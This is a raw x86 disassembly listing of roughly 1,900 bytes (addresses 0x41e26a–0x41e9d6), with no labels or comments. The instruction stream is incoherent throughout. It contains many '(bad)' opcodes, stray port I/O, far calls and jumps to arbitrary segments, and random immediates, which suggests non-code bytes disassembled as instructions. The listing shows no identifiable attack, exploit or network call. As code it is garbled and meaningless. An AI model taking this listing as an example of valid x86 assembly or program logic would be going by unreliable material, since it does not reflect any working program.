  41e26a:	add    DWORD PTR [edi-0x220c2adb],esp
  41e270:	xlat   BYTE PTR ds:[ebx]
  41e271:	push   cs
  41e272:	outs   dx,DWORD PTR ds:[esi]
  41e273:	ins    DWORD PTR es:[edi],dx
  41e274:	(bad)  
  41e275:	in     eax,dx
  41e276:	call   0xf084:0x3a633b03
  41e27d:	adc    eax,0x5f61a5b8
  41e282:	scas   eax,DWORD PTR es:[edi]
  41e283:	fstp   QWORD PTR [edx+0x64]
  41e286:	fidivr DWORD PTR [ebp+0x2c]
  41e289:	push   cs
  41e28a:	sub    dh,BYTE PTR [edi]
  41e28c:	inc    esi
  41e28d:	call   0x32ad:0x3d1e
  41e293:	dec    ebx
  41e294:	icebp  
  41e295:	ret    
  41e296:	fisub  DWORD PTR [esi-0x1dd4ee9e]
  41e29c:	popa   
  41e29d:	imul   ecx,ebx,0x47
  41e2a0:	repz cmp ah,BYTE PTR [ecx-0x4efb79c9]
  41e2a7:	mov    bl,0x48
  41e2a9:	imul   ebp,DWORD PTR [eax],0xffffffbd
  41e2ac:	(bad)  
  41e2ad:	mov    dh,0x46
  41e2af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2b0:	jbe    0x41e295
  41e2b2:	mov    BYTE PTR [esi-0x38e0a362],al
  41e2b8:	push   eax
  41e2b9:	sbb    eax,0xbe0d5595
  41e2be:	jge    0x41e327
  41e2c0:	xlat   BYTE PTR ds:[ebx]
  41e2c1:	push   eax
  41e2c2:	add    ecx,ebx
  41e2c4:	add    edi,DWORD PTR [edi+0x4e]
  41e2c7:	mov    ecx,0x591f1bd0
  41e2cc:	xor    dl,BYTE PTR [ecx]
  41e2ce:	mov    ch,0xd6
  41e2d0:	out    dx,al
  41e2d1:	mov    ebp,0x8fb27273
  41e2d6:	jle    0x41e2b4
  41e2d8:	inc    ebp
  41e2d9:	mov    bh,0xfe
  41e2db:	xor    DWORD PTR [esi+0xb],ebp
  41e2de:	mov    al,ds:0x8e36410d
  41e2e3:	mov    eax,0xef9af15e
  41e2e8:	cwde   
  41e2e9:	lea    edi,[edx+0xeec11fa]
  41e2ef:	mov    ebx,0xe74a5ffc
  41e2f4:	cmp    dh,BYTE PTR [edx-0x5f9c7136]
  41e2fa:	call   0x423f:0x5069e4d5
  41e301:	jmp    0xd2bf:0x346ba73b
  41e308:	adc    DWORD PTR [edx],ecx
  41e30a:	sub    eax,0xa814b1a3
  41e30f:	imul   BYTE PTR [ebx+0x1f0ff3b2]
  41e315:	imul   ebx,DWORD PTR [ebp-0x59],0x2c6c58ff
  41e31c:	ins    DWORD PTR es:[edi],dx
  41e31d:	inc    esp
  41e31e:	jns    0x41e335
  41e320:	mov    ebp,0x7569da7
  41e325:	sub    ebp,DWORD PTR [esi]
  41e327:	push   ebx
  41e328:	fwait
  41e329:	mov    esi,ebx
  41e32b:	pop    ebp
  41e32c:	iret   
  41e32d:	ss (bad) 
  41e32f:	call   0xf3c4:0x9dc2fdb2
  41e336:	sbb    BYTE PTR [edx-0x4e],0x5a
  41e33a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e33b:	mov    ds:0xc02d8e40,eax
  41e340:	mov    ah,0x1d
  41e342:	ins    DWORD PTR es:[edi],dx
  41e343:	je     0x41e353
  41e345:	or     eax,DWORD PTR [ebx+0xb]
  41e348:	sub    al,BYTE PTR [ebp+edx*4-0x6566fda3]
  41e34f:	adc    DWORD PTR [ebx],ebx
  41e351:	jg     0x41e3a6
  41e353:	jmp    0x6084:0xa93f509c
  41e35a:	jne    0x41e34d
  41e35c:	rcr    BYTE PTR [esi-0x41e2c494],cl
  41e362:	mov    ds:0xb38b04cf,eax
  41e367:	and    BYTE PTR [ecx+edi*1+0xbd51a61],bl
  41e36e:	xor    eax,DWORD PTR [ebp+0x4162a708]
  41e374:	out    dx,eax
  41e375:	fs out dx,al
  41e377:	mov    bl,0xb1
  41e379:	mov    eax,ds:0x74477f68
  41e37e:	jb     0x41e3e7
  41e380:	aad    0x84
  41e382:	stos   DWORD PTR es:[edi],eax
  41e383:	push   ebx
  41e384:	jle    0x41e39c
  41e386:	out    dx,eax
  41e387:	xor    BYTE PTR [ebp+0xb],0x55
  41e38b:	sahf   
  41e38c:	xchg   ebx,eax
  41e38d:	rcl    DWORD PTR [esi+edi*2-0x4f],cl
  41e391:	ret    0xea1e
  41e394:	xchg   bl,bh
  41e396:	shl    DWORD PTR [edi],cl
  41e398:	shl    BYTE PTR [esi],0x52
  41e39b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e39c:	pop    es
  41e39d:	pop    edi
  41e39e:	(bad)  
  41e39f:	and    DWORD PTR [edx],0xffffff9d
  41e3a2:	mov    cs,WORD PTR [edi-0x4b]
  41e3a5:	mov    ebp,0xa1b3d00b
  41e3aa:	sbb    ch,BYTE PTR [esi]
  41e3ac:	repnz push 0xfffffffa
  41e3af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3b0:	jp     0x41e362
  41e3b2:	push   esp
  41e3b3:	mov    eax,0x62019e82
  41e3b8:	mov    dl,0x6c
  41e3ba:	jo     0x41e349
  41e3bc:	jo     0x41e3fe
  41e3be:	adc    al,0xc9
  41e3c0:	stos   DWORD PTR es:[edi],eax
  41e3c1:	jp     0x41e3da
  41e3c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3c4:	cmp    ah,BYTE PTR [edx]
  41e3c6:	jge    0x41e3ba
  41e3c8:	ror    BYTE PTR [edi-0x21],0x82
  41e3cc:	mov    dl,0xb0
  41e3ce:	pop    eax
  41e3cf:	cld    
  41e3d0:	inc    ebp
  41e3d1:	mov    esi,0xbb463f8
  41e3d6:	push   edi
  41e3d7:	mov    cl,BYTE PTR [ebx-0x77a8829a]
  41e3dd:	sbb    ebx,DWORD PTR [edx+0x218ae153]
  41e3e3:	in     al,dx
  41e3e4:	rol    BYTE PTR [ebx-0x3f],0xa7
  41e3e8:	xor    ch,dh
  41e3ea:	jmp    0x675c0641
  41e3ef:	jno    0x41e379
  41e3f1:	lods   eax,DWORD PTR ds:[esi]
  41e3f2:	push   0xecc42827
  41e3f7:	popf   
  41e3f8:	das    
  41e3f9:	inc    esp
  41e3fa:	mov    edi,0x1004e6a8
  41e3ff:	push   esp
  41e400:	adc    bl,ah
  41e402:	mov    bh,0x89
  41e404:	out    dx,al
  41e405:	mov    BYTE PTR [edx-0x75391c5c],bl
  41e40b:	sub    cl,BYTE PTR [eax-0x7c]
  41e40e:	add    BYTE PTR [eax+0x482b99fe],ch
  41e414:	xor    dh,dl
  41e416:	xor    al,0x61
  41e418:	adc    DWORD PTR [ecx+ebx*4+0x75],esp
  41e41c:	push   eax
  41e41d:	loopne 0x41e498
  41e41f:	cli    
  41e420:	icebp  
  41e421:	stos   DWORD PTR es:[edi],eax
  41e422:	fbld   TBYTE PTR [edx+edi*2+0xb]
  41e426:	cdq    
  41e427:	test   al,0x1c
  41e429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e42a:	mov    esi,0xd6845e9f
  41e42f:	bnd jg 0x41e43d
  41e432:	je     0x41e420
  41e434:	inc    edx
  41e435:	pop    ecx
  41e436:	cmp    ebx,DWORD PTR [ecx+0x28]
  41e439:	or     eax,esi
  41e43b:	lock imul edx,DWORD PTR [ebp+0x58051e09],0x4e37199a
  41e446:	jp     0x41e3f3
  41e448:	adc    al,BYTE PTR [ebx+ebx*1+0x430b1bdc]
  41e44f:	and    eax,0x4652c02b
  41e454:	mov    bl,0x39
  41e456:	call   0x7c82:0xab1755ae
  41e45d:	push   ebp
  41e45e:	lods   eax,DWORD PTR ds:[esi]
  41e45f:	test   eax,0xe2307282
  41e464:	jb     0x41e400
  41e466:	inc    ecx
  41e467:	adc    eax,DWORD PTR [edi+edx*4]
  41e46a:	jle    0x41e3f6
  41e46c:	mov    dl,0x6b
  41e46e:	xchg   edi,eax
  41e46f:	jle    0x41e476
  41e471:	cmp    DWORD PTR [edi+edx*8-0x1417f4bf],0x4d
  41e479:	or     eax,0xfc5328eb
  41e47e:	lea    edx,[ecx+edx*4]
  41e481:	fwait
  41e482:	jo     0x41e42b
  41e484:	jge    0x41e45d
  41e486:	and    bh,BYTE PTR [edx-0x11174a00]
  41e48c:	xchg   esp,eax
  41e48d:	mov    esp,0x5cad82a9
  41e492:	enter  0xb28e,0x35
  41e496:	pop    ebx
  41e497:	out    0x29,eax
  41e499:	mov    ch,0x4b
  41e49b:	xlat   BYTE PTR ds:[ebx]
  41e49c:	scas   eax,DWORD PTR es:[edi]
  41e49d:	or     esp,DWORD PTR [ecx]
  41e49f:	(bad)  
  41e4a1:	aas    
  41e4a2:	lds    esi,FWORD PTR [edi]
  41e4a4:	stos   DWORD PTR es:[edi],eax
  41e4a5:	rcr    DWORD PTR [edx+0x48f598fe],cl
  41e4ab:	(bad)  
  41e4ac:	and    BYTE PTR [ebp+0xcbade69],cl
  41e4b2:	inc    esp
  41e4b3:	sbb    DWORD PTR [ebx+0x5af73fc7],edi
  41e4b9:	mov    cl,0x42
  41e4bb:	xor    BYTE PTR [edx+0x56a633c0],0xf0
  41e4c2:	add    al,0xf9
  41e4c4:	shl    DWORD PTR [esi],0x7c
  41e4c7:	xchg   esi,eax
  41e4c8:	mov    dl,0x9c
  41e4ca:	pop    es
  41e4cb:	mov    al,ds:0x4f474f03
  41e4d0:	mov    bl,0xc4
  41e4d2:	sub    eax,0x89459cdf
  41e4d7:	loope  0x41e53f
  41e4d9:	stos   DWORD PTR es:[edi],eax
  41e4da:	mov    bl,0x9c
  41e4dc:	inc    esi
  41e4dd:	cwde   
  41e4de:	call   0xbb1e:0x7b15c32b
  41e4e5:	loopne 0x41e482
  41e4e7:	ins    BYTE PTR es:[edi],dx
  41e4e8:	leave  
  41e4e9:	dec    edi
  41e4ea:	push   cs
  41e4eb:	rcl    DWORD PTR [ebx+ebp*2],cl
  41e4ee:	jle    0x41e4b5
  41e4f0:	push   es
  41e4f1:	or     ch,bl
  41e4f3:	jmp    0x41e4f9
  41e4f5:	call   0xc41da468
  41e4fa:	scas   al,BYTE PTR es:[edi]
  41e4fb:	push   0xffffff8c
  41e4fd:	jns    0x41e53d
  41e4ff:	pop    ds
  41e500:	cmp    cl,BYTE PTR [ebx-0x308185d3]
  41e506:	sahf   
  41e507:	push   es
  41e508:	or     BYTE PTR [ebx],0xf4
  41e50b:	daa    
  41e50c:	xor    esp,DWORD PTR [edx+ecx*2-0x55]
  41e510:	mov    WORD PTR [edi+0xa],gs
  41e513:	pop    ss
  41e514:	mov    dl,0xb9
  41e516:	push   ecx
  41e517:	push   ebx
  41e518:	out    dx,al
  41e519:	lods   eax,DWORD PTR ds:[esi]
  41e51a:	jns    0x41e4cf
  41e51c:	jb     0x41e529
  41e51e:	push   edi
  41e51f:	pop    ds
  41e520:	mov    cl,0x87
  41e522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e523:	sbb    al,0xfd
  41e525:	jne    0x41e4c1
  41e527:	fbld   TBYTE PTR [eax+ecx*2]
  41e52a:	sahf   
  41e52b:	jmp    FWORD PTR [ecx-0x8]
  41e52e:	lods   al,BYTE PTR cs:[esi]
  41e530:	cli    
  41e531:	ds sbb ebp,esp
  41e534:	xor    esi,DWORD PTR [esi-0x28e14489]
  41e53a:	mov    BYTE PTR [ebx+ecx*4],bh
  41e53d:	ret    0x2757
  41e540:	ret    0x926f
  41e543:	xchg   DWORD PTR [ecx-0x41409311],edi
  41e549:	pop    ss
  41e54a:	and    eax,edi
  41e54c:	sti    
  41e54d:	sbb    DWORD PTR [ebx-0x67818dd],ebx
  41e553:	ror    ebx,1
  41e555:	xor    eax,0xbc82ffa
  41e55a:	aam    0xc2
  41e55c:	mov    cl,0xb0
  41e55e:	ja     0x41e5b1
  41e560:	ffree  st(2)
  41e562:	out    0xbc,eax
  41e564:	mov    bl,0xad
  41e566:	stos   DWORD PTR es:[edi],eax
  41e567:	outs   dx,DWORD PTR ds:[esi]
  41e568:	(bad)  
  41e569:	fadd   DWORD PTR [edi-0x28498101]
  41e56f:	pop    ecx
  41e570:	mov    bh,0x4
  41e572:	cmp    eax,esp
  41e574:	jg     0x41e549
  41e576:	fcmove st,st(5)
  41e578:	out    0xb9,eax
  41e57a:	(bad)  
  41e57c:	mov    dl,BYTE PTR [ecx+esi*4]
  41e57f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e580:	sbb    DWORD PTR [ebx*4+0x5cc3ef35],eax
  41e587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e588:	mov    esi,0x3ff07bc4
  41e58d:	xchg   esp,eax
  41e58e:	stos   DWORD PTR es:[edi],eax
  41e58f:	sbb    BYTE PTR [edx+0x7ca611f8],cl
  41e595:	popa   
  41e596:	pop    ebx
  41e597:	push   cs
  41e598:	ret    
  41e599:	ss inc edx
  41e59b:	mov    BYTE PTR [edi+0xb],dl
  41e59e:	inc    edx
  41e59f:	pop    edx
  41e5a0:	inc    edx
  41e5a1:	mov    bh,0x61
  41e5a3:	(bad)  
  41e5a5:	pop    ecx
  41e5a6:	test   DWORD PTR [ebp+0x2],edx
  41e5a9:	jo     0x41e5fc
  41e5ab:	loopne 0x41e596
  41e5ad:	mov    ebx,DWORD PTR ds:0x36ba3843
  41e5b3:	shl    ch,1
  41e5b5:	or     esp,DWORD PTR [ebp-0x737f464]
  41e5bb:	int    0xde
  41e5bd:	or     DWORD PTR [edx+0x6d3511ab],ebx
  41e5c3:	jmp    0x41e62d
  41e5c5:	adc    al,0xe3
  41e5c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5c8:	dec    edi
  41e5c9:	add    edi,DWORD PTR [edi]
  41e5cb:	sbb    BYTE PTR [esi],dl
  41e5cd:	lahf   
  41e5ce:	sub    ch,BYTE PTR [ebp+0x479d36ea]
  41e5d4:	rcl    BYTE PTR [eax+0x61],0x1e
  41e5d8:	ror    BYTE PTR [edi+0xcf310fa],cl
  41e5de:	pop    edx
  41e5df:	jp     0x41e5fa
  41e5e1:	imul   edi,DWORD PTR [edi+0x60],0x1f093bfe
  41e5e8:	pop    edx
  41e5e9:	xor    bl,BYTE PTR [edx+0x6e9f9bbb]
  41e5ef:	xor    eax,0xa7ccf9ce
  41e5f4:	push   esi
  41e5f5:	arpl   WORD PTR [edx+0x4453f067],bp
  41e5fb:	xchg   ebx,eax
  41e5fc:	mov    dl,0xb9
  41e5fe:	loopne 0x41e5d5
  41e600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e601:	(bad)  
  41e602:	cdq    
  41e603:	je     0x41e594
  41e605:	or     esp,DWORD PTR ds:0xc8cb7d1c
  41e60b:	push   edx
  41e60c:	dec    ecx
  41e60d:	mov    ds:0x2a3959a,al
  41e612:	in     al,0xaf
  41e614:	mov    ebp,0xffa7574d
  41e619:	stos   BYTE PTR es:[edi],al
  41e61a:	lods   al,BYTE PTR ds:[esi]
  41e61b:	int    0xd
  41e61d:	push   ss
  41e61e:	push   ebp
  41e61f:	dec    esi
  41e620:	mov    dl,0xd0
  41e622:	(bad)
  41e625:	pop    edi
  41e626:	xor    ch,BYTE PTR [ecx-0x25]
  41e629:	or     ebp,ebp
  41e62b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e62c:	jno    0x41e5eb
  41e62e:	retf   0x311b
  41e631:	aad    0x99
  41e633:	and    eax,0x46587b7
  41e638:	sahf   
  41e639:	add    DWORD PTR [ebx-0x53f4d435],0xffffffc4
  41e640:	out    dx,eax
  41e641:	sti    
  41e642:	mov    ebp,0xb6991793
  41e647:	bound  ecx,QWORD PTR [ebx]
  41e649:	loope  0x41e5df
  41e64b:	ins    BYTE PTR es:[edi],dx
  41e64c:	xor    ebp,DWORD PTR [esi+edi*8+0x406e1264]
  41e653:	popf   
  41e654:	mov    cl,0xf
  41e656:	out    0x4e,eax
  41e658:	lahf   
  41e659:	pop    ds
  41e65a:	frstor [edx]
  41e65c:	push   0xffffff8b
  41e65e:	or     al,0x1c
  41e660:	adc    DWORD PTR [ecx],eax
  41e662:	cdq    
  41e663:	mov    WORD PTR [eax*4-0x47862408],es
  41e66a:	movq   QWORD PTR [edi+eax*1-0xe],mm1
  41e66f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e670:	sbb    eax,ecx
  41e672:	addr16 jae 0x41e660
  41e675:	mov    ebp,DWORD PTR [edx]
  41e677:	pop    es
  41e678:	push   eax
  41e679:	retf   0xb09d
  41e67c:	arpl   WORD PTR [edi-0x6b],cx
  41e67f:	xchg   edx,eax
  41e680:	shl    cl,cl
  41e682:	fld    st(6)
  41e684:	ror    DWORD PTR [ebx],0xb4
  41e687:	call   DWORD PTR [edi+0x1]
  41e68a:	pop    ebp
  41e68b:	popa   
  41e68c:	std    
  41e68d:	push   esp
  41e68e:	out    dx,al
  41e68f:	dec    edx
  41e690:	mov    ch,0xa9
  41e692:	mov    esp,0xbaca917c
  41e697:	in     eax,dx
  41e698:	xchg   DWORD PTR [esi],ebp
  41e69a:	mov    eax,ds:0xc45255a6
  41e69f:	js     0x41e6b7
  41e6a1:	scas   al,BYTE PTR es:[edi]
  41e6a2:	out    0x87,al
  41e6a4:	out    0xd9,al
  41e6a6:	jecxz  0x41e64b
  41e6a8:	mov    bl,0xb5
  41e6aa:	or     ah,cl
  41e6ac:	inc    edi
  41e6ad:	and    dl,BYTE PTR [ecx-0xb21853b]
  41e6b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6b4:	jl     0x41e6a4
  41e6b6:	and    eax,0x1fe33b2b
  41e6bb:	mov    al,ds:0xeee619b2
  41e6c0:	pop    es
  41e6c1:	dec    edi
  41e6c2:	fmul   DWORD PTR [edx-0x62]
  41e6c5:	or     ah,BYTE PTR [ebp-0xbebb466]
  41e6cb:	mov    eax,ds:0xb2205a7b
  41e6d1:	rcl    BYTE PTR [ecx+0x6bb97018],1
  41e6d7:	rol    DWORD PTR [edx+0xc],cl
  41e6da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6db:	dec    edx
  41e6dc:	sbb    BYTE PTR [edi],ah
  41e6de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6df:	pop    ecx
  41e6e0:	push   edx
  41e6e1:	mov    edi,0x43171245
  41e6e6:	call   0xba9193a3
  41e6eb:	scas   eax,DWORD PTR es:[edi]
  41e6ec:	xor    dh,dl
  41e6ee:	mov    ah,0x4c
  41e6f0:	outs   dx,DWORD PTR cs:[esi]
  41e6f2:	and    esp,DWORD PTR [edi-0x2b569f63]
  41e6f8:	imul   ecx,ebp,0x6bb2c8dc
  41e6fe:	in     al,0x80
  41e700:	sbb    DWORD PTR [eax+edx*1+0x290bde22],ebx
  41e707:	xor    DWORD PTR es:[ebx-0x6d],0x5a
  41e70c:	rcl    edx,1
  41e70e:	call   0x726a:0xba4d09fd
  41e715:	pop    ebx
  41e716:	enter  0x37a9,0x12
  41e71a:	adc    eax,0x417eb272
  41e71f:	xchg   esp,eax
  41e720:	xchg   ecx,eax
  41e721:	pop    esi
  41e722:	call   0x19:0x141c802f
  41e729:	jnp    0x41e6f3
  41e72b:	lahf   
  41e72c:	test   BYTE PTR [ebp+0x15951e18],ah
  41e732:	std    
  41e733:	push   eax
  41e734:	jb     0x41e740
  41e736:	fdiv   DWORD PTR [ebp+0x4450c9b2]
  41e73c:	dec    edi
  41e73d:	imul   esp,DWORD PTR [ebx+0x4e16024f],0xa14b7598
  41e747:	xchg   esi,eax
  41e748:	pusha  
  41e749:	push   eax
  41e74a:	out    0xe1,al
  41e74c:	mov    ecx,0xc550168a
  41e751:	or     ebp,DWORD PTR [edi+0x25bd69a]
  41e757:	mov    eax,0xe6acbef7
  41e75c:	fnstcw WORD PTR [edi+0xc]
  41e75f:	push   ebp
  41e760:	mov    esp,ebx
  41e762:	test   DWORD PTR [eax],ecx
  41e764:	add    ah,BYTE PTR [ebp-0x5c88f166]
  41e76a:	xchg   ecx,eax
  41e76b:	pusha  
  41e76c:	mov    bh,0x4e
  41e76e:	retf   
  41e76f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e770:	cmp    BYTE PTR [ecx+ecx*8-0x7e80e017],bl
  41e777:	or     BYTE PTR [edx-0x1be5420c],dh
  41e77d:	test   eax,0x13163a5d
  41e782:	sub    BYTE PTR [edx-0x5789329c],dl
  41e788:	mov    ah,0xad
  41e78a:	fdivr  QWORD PTR fs:[edi-0x28]
  41e78e:	rcl    ah,cl
  41e790:	dec    edx
  41e791:	or     ebp,DWORD PTR [esi]
  41e793:	in     eax,dx
  41e794:	mov    ecx,0x17b3f73
  41e799:	neg    BYTE PTR [edx+0x4afdf26b]
  41e79f:	in     eax,0x7b
  41e7a1:	shl    DWORD PTR [eax+eiz*4],0xcc
  41e7a5:	mov    esi,0x3bf6419c
  41e7aa:	daa    
  41e7ab:	cmp    dl,BYTE PTR [esi-0x4d2efdfb]
  41e7b1:	test   DWORD PTR [ebx-0xc],esp
  41e7b4:	and    eax,0xa31173ce
  41e7b9:	or     edx,DWORD PTR [edx]
  41e7bb:	pushf  
  41e7bc:	enter  0x5aac,0xe9
  41e7c0:	inc    BYTE PTR [ecx]
  41e7c2:	pop    edx
  41e7c3:	add    eax,0xc968819e
  41e7c8:	ins    BYTE PTR es:[edi],dx
  41e7c9:	or     esp,DWORD PTR [ebx-0x6d]
  41e7cc:	inc    esp
  41e7cd:	push   ebp
  41e7ce:	adc    eax,0x9afa27e6
  41e7d3:	dec    edx
  41e7d4:	rcl    edx,cl
  41e7d6:	loopne 0x41e7a6
  41e7d8:	sub    bl,BYTE PTR [ecx]
  41e7da:	jo     0x41e765
  41e7dc:	scas   eax,DWORD PTR es:[edi]
  41e7dd:	lea    esp,[ebp+0x5533e0a4]
  41e7e3:	shl    DWORD PTR [edx-0x36],0xb1
  41e7e7:	pop    ss
  41e7e8:	mov    ebx,0xb6c9a199
  41e7ed:	mov    edx,DWORD PTR [ebx-0x34]
  41e7f0:	cmp    esp,ebp
  41e7f2:	jnp    0x41e79a
  41e7f4:	mov    edx,0xc4ae85a3
  41e7f9:	(bad)  [ebx+ebx*2-0x22662a2d]
  41e800:	inc    edi
  41e801:	inc    ecx
  41e802:	mov    eax,0x91db3e64
  41e807:	sbb    al,0x76
  41e809:	or     BYTE PTR ds:0x7895e6db,bl
  41e80f:	push   ebx
  41e810:	adc    dl,ah
  41e812:	iret   
  41e813:	ds mov dl,0xec
  41e816:	scas   eax,DWORD PTR es:[edi]
  41e817:	stc    
  41e818:	cmc    
  41e819:	sub    DWORD PTR [edi-0x75fb1028],ecx
  41e81f:	mov    BYTE PTR [edx+0x57],ch
  41e822:	cli    
  41e823:	sub    cl,BYTE PTR [eax-0x4dc0f7d4]
  41e829:	arpl   WORD PTR [ebx+0x14],dx
  41e82c:	arpl   WORD PTR [edi],dx
  41e82e:	push   edx
  41e82f:	pop    edi
  41e830:	out    dx,eax
  41e831:	or     ebx,DWORD PTR [eax+0x78]
  41e834:	inc    ebx
  41e835:	outs   dx,DWORD PTR ds:[esi]
  41e836:	jne    0x41e7e6
  41e838:	jmp    0x900e:0xaeb3e88f
  41e83f:	call   0x50f8:0x62109f72
  41e846:	imul   esp,DWORD PTR [edi+0x4c036251],0x44
  41e84d:	xchg   ecx,eax
  41e84e:	gs xchg esp,eax
  41e850:	mov    dl,0xa3
  41e852:	and    al,0xe3
  41e854:	pop    es
  41e855:	(bad)  
  41e856:	mov    dl,0xf0
  41e858:	push   esp
  41e859:	pop    ss
  41e85a:	mov    ah,0xc4
  41e85c:	lds    ecx,FWORD PTR [eax+0x6be25e78]
  41e862:	(bad)  
  41e863:	mul    BYTE PTR [edx+0x39109ab9]
  41e869:	fstp   DWORD PTR [ebp-0x72]
  41e86c:	lods   eax,DWORD PTR ds:[esi]
  41e86d:	iret   
  41e86e:	ja     0x41e817
  41e870:	mov    bh,0xd1
  41e872:	rcr    ecx,cl
  41e874:	pop    ecx
  41e875:	push   edx
  41e876:	dec    ebx
  41e877:	les    esi,FWORD PTR [edx+0x521cec91]
  41e87d:	out    0x99,eax
  41e87f:	idiv   ebp
  41e881:	or     al,0x1
  41e883:	sub    BYTE PTR [eax+0x7e],bl
  41e886:	imul   eax,DWORD PTR [edi-0x31d95faf],0xffffffb2
  41e88d:	dec    edx
  41e88e:	sahf   
  41e88f:	mov    al,ds:0x60b1d901
  41e894:	fimul  WORD PTR [ebx]
  41e896:	pop    edi
  41e897:	sub    BYTE PTR [ecx+esi*2],al
  41e89a:	(bad)  
  41e89c:	sbb    al,0x43
  41e89e:	mov    ah,0xbe
  41e8a0:	test   ah,0xa3
  41e8a3:	daa    
  41e8a4:	mov    edi,0x8d6ffc93
  41e8a9:	test   DWORD PTR [esi-0x59],ecx
  41e8ac:	mov    al,ds:0xdf4e3f45
  41e8b1:	sbb    BYTE PTR [edi+0x6a],bh
  41e8b4:	(bad)  
  41e8b5:	in     eax,0x9a
  41e8b7:	and    BYTE PTR [ecx-0x56e2d207],cl
  41e8bd:	adc    eax,0x491d946b
  41e8c2:	out    dx,al
  41e8c3:	push   ebx
  41e8c4:	add    eax,DWORD PTR [ebx]
  41e8c6:	scas   al,BYTE PTR es:[edi]
  41e8c7:	dec    ebx
  41e8c8:	out    dx,eax
  41e8c9:	xchg   ebx,eax
  41e8ca:	fwait
  41e8cb:	cdq    
  41e8cc:	xchg   ebx,eax
  41e8cd:	rol    DWORD PTR [eax-0x5f8cacb8],1
  41e8d3:	daa    
  41e8d4:	test   DWORD PTR [ecx-0x23],0xb679b58c
  41e8db:	push   cs
  41e8dc:	sub    DWORD PTR [ebp-0x541d2287],ebp
  41e8e2:	xor    eax,0x7b0bde55
  41e8e7:	scas   al,BYTE PTR es:[edi]
  41e8e8:	pusha  
  41e8e9:	jp     0x41e886
  41e8eb:	pop    ebp
  41e8ec:	pop    edx
  41e8ed:	dec    edx
  41e8ee:	gs daa 
  41e8f0:	test   al,cl
  41e8f2:	rol    DWORD PTR [ecx+0x3b],1
  41e8f5:	cli    
  41e8f6:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41e8f8:	push   ds
  41e8f9:	cmp    al,0xcc
  41e8fb:	cmp    dl,BYTE PTR [eax-0x46]
  41e8fe:	mov    ds:0x7222b231,al
  41e903:	mov    ds:0xb2e84b48,al
  41e908:	test   DWORD PTR [ebx],0xc24adf4a
  41e90e:	and    dh,bh
  41e910:	mov    esi,0xb25cef95
  41e915:	stos   DWORD PTR es:[edi],eax
  41e916:	mov    edx,0xce607ae9
  41e91b:	inc    esi
  41e91c:	fmul   QWORD PTR [ebx]
  41e91e:	leave  
  41e91f:	cwde   
  41e920:	inc    edi
  41e921:	inc    eax
  41e922:	in     eax,dx
  41e923:	mov    WORD PTR [edx-0x63],bp
  41e927:	inc    eax
  41e928:	sub    al,0x20
  41e92a:	adc    BYTE PTR [ebx+0x52],al
  41e92d:	jg     0x41e8f2
  41e92f:	push   edi
  41e930:	pusha  
  41e931:	add    al,0xb7
  41e933:	test   BYTE PTR [ebx],0x8c
  41e936:	fwait
  41e937:	sbb    BYTE PTR [ebp-0x1691bf7e],bh
  41e93d:	retf   
  41e93e:	xor    ah,BYTE PTR [eax-0x58289376]
  41e944:	mov    bh,0x4b
  41e946:	pop    ss
  41e947:	or     DWORD PTR ds:0xaeba54fd,edi
  41e94d:	bound  edx,QWORD PTR [ebx]
  41e94f:	out    0xf3,eax
  41e951:	push   es
  41e952:	mov    dl,0x1c
  41e954:	sbb    eax,0x17d28e41
  41e959:	pop    ebx
  41e95a:	add    ah,BYTE PTR [edi+0x54865f2d]
  41e960:	ins    BYTE PTR es:[edi],dx
  41e961:	inc    edi
  41e962:	pusha  
  41e963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e964:	(bad)  
  41e965:	push   ebp
  41e966:	rcr    esi,1
  41e968:	or     cl,BYTE PTR [esi+0x22b367cd]
  41e96e:	mov    DWORD PTR [ebp+0x348de485],esp
  41e974:	add    ax,0xa766
  41e978:	add    cl,BYTE PTR [ebx*8+0x4bf8197d]
  41e97f:	xor    esi,DWORD PTR [edx-0x3a2e7a33]
  41e985:	mov    ?,WORD PTR [edi-0x1bf4a023]
  41e98b:	cmp    eax,0x912c7e32
  41e990:	adc    ch,BYTE PTR [edi-0x6c]
  41e993:	jo     0x41e985
  41e995:	push   cs
  41e996:	pop    ebx
  41e997:	push   ebp
  41e998:	mov    ebp,0x2727c5e3
  41e99d:	mov    ch,0xe1
  41e99f:	ins    DWORD PTR es:[edi],dx
  41e9a0:	adc    DWORD PTR [ebx],ecx
  41e9a2:	cs jle 0x41e940
  41e9a5:	imul   ebx,ecx,0x9a98cfd8
  41e9ab:	sbb    edx,DWORD PTR [ebx-0x72]
  41e9ae:	push   cs
  41e9af:	and    eax,DWORD PTR [edx+0x15a64106]
  41e9b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9b6:	and    dl,bh
  41e9b8:	jge    0x41e98d
  41e9ba:	dec    ebp
  41e9bb:	outs   dx,DWORD PTR ds:[esi]
  41e9bc:	bound  edi,QWORD PTR [edi-0x6cec0866]
  41e9c2:	jns    0x41e965
  41e9c4:	push   ds
  41e9c5:	mov    BYTE PTR [ebx],dh
  41e9c7:	mov    al,ds:0xd2175301
  41e9cc:	mov    bl,0x3b
  41e9ce:	jl     0x41ea40
  41e9d0:	scas   eax,DWORD PTR es:[edi]
  41e9d1:	aaa    
  41e9d2:	fwait
  41e9d3:	xchg   BYTE PTR [ecx-0x69],cl
  41e9d6:	dec    esi
